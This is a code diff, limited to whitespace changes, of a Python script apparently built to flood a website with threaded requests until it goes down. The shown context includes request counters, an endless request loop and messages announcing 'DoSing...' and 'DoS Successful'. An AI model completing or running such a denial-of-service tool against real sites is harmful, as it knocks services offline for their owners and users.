@@ -5,14 +5,11 @@ import time
 l = []
 rl = []
 
-
 def current_mil_time():
     return round(time.time() * 1000)
 
-
 def current_sec_time():
     return round(time.time())
-
 
 def count_resp_per_sec(time_took):
     t = current_sec_time()
@@ -25,7 +22,6 @@ def count_resp_per_sec(time_took):
         if current_sec_time() - e["time_received"] >= 1:
             l.remove(e)
 
-
 def count_req_per_sec():
     t = current_sec_time()
     rl.append({
@@ -36,9 +32,7 @@ def count_req_per_sec():
         if current_sec_time() - e["time_received"] >= 1:
             rl.remove(e)
 
-
 message = "DoSing..."
-
 
 def make_request(name):
     while True:
@@ -51,7 +45,6 @@ def make_request(name):
             count_resp_per_sec(t)
         except:
             message = "DoS Successful. Site looks down for now."
-
 
 threads = 10
 i = 0
